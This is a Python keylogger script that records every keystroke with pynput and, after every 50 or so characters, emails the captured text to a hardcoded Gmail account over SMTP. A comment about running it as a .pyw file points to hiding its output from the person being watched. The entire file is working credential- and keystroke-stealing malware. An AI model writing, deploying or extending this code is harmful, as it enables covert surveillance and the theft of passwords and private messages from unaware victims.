import getpass
import smtplib,ssl

from pynput.keyboard import Key, Listener

#email info
email = "keyloggeremailtester@gmail.com"
password = "passwordforkeylogger"
port = 465

#logger
email_log = ''
word = ''
email_char_limit = 50


def on_press(key):
    global word
    global email_log
    global email
    global email_char_limit

    #whitespace
    if key == Key.space or key == Key.enter or key == Key.tab:
        if key == Key.space:
            word += ' '
        elif key == Key.enter:
            word += '\n'
        elif key == Key.tab:
            word += '\t'

        email_log += word
        word = ''
        if len(email_log) >= email_char_limit:
            send_log()
            print(email_log)    #won't show up if .pyw
            email_log = ''

    #special keys
    elif key == Key.shift_l or key == Key.shift_r:
        #do not print shift keys
        return
    elif key == Key.backspace:
        word = word[:-1]
    elif key == Key.caps_lock or key == Key.ctrl_l or key == Key.ctrl_r or key == Key.cmd or key == Key.menu or key == Key.insert or key == Key.delete or key == Key.home or key == Key.num_lock or key == Key.left or key == Key.right or key == Key.up or key == Key.down or key == Key.end or key == Key.page_up or key == Key.page_down:
        char = f'{key}'
        char = char.replace("Key.", "")  # strip char of 'Key.'
        word += '[' + char + ']'
    #cmd                    also known as the Windows key
    #menu                   on Windows oriented keyboards
    #                       Looks like a hamburger button, sometimes inside of a box and/or with a mouse.
    #left,right,up,down     arrow keys

    #Print F#
    elif key==Key.f1 or key==Key.f2 or key==Key.f3 or key==Key.f4 or key==Key.f5 or key==Key.f6 or key==Key.f7 or key==Key.f8 or key==Key.f9 or key==Key.f10 or key==Key.f11 or key==Key.f12:
        char = f'{key}'
        char = char.replace("'", "")   #strip char of apostrophes
        char = char.replace("Key.", "")    #strip char of 'Key.'
        char = '[' + char + ']'
        word += char.upper()

    #numpad numbers
    elif hasattr(key, 'vk') and key.vk >= 96 and key.vk <=105:
        #TODO: either fix this block, or make a separate elif statement for each digit
        # num = f'{key}'
        # num = num.replace("<", "")    #strip of <>
        # num = num.replace(">", "")
        # numInt = int(num)
        # numInt -= 96
        # word += numInt        #Crashes when you print numInt
        word += '[numpad]'  #TODO: remove this
    #numpad decimal
    elif hasattr(key, 'vk') and key.vk == 110:
        word+='.'

    #regular keys and F keys, and other unknown keys
    else:
        char = f'{key}'
        char = char.replace("'","") #strip char of apostrophes
        char = char.replace("Key.", "")    #strip char of 'Key.'
        word += char

    #Closes the program upon pressing Esc
    #TODO: log Esc key instead
    if key == Key.esc:
        return False


#send email
def send_log():
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com',port)
        server.ehlo()
        server.login(email,password)
        server.sendmail(email,email,email_log)
        server.close()
        print("Email sent")
    except:
        print("Email not sent")


with Listener(on_press=on_press) as listener:
    listener.join()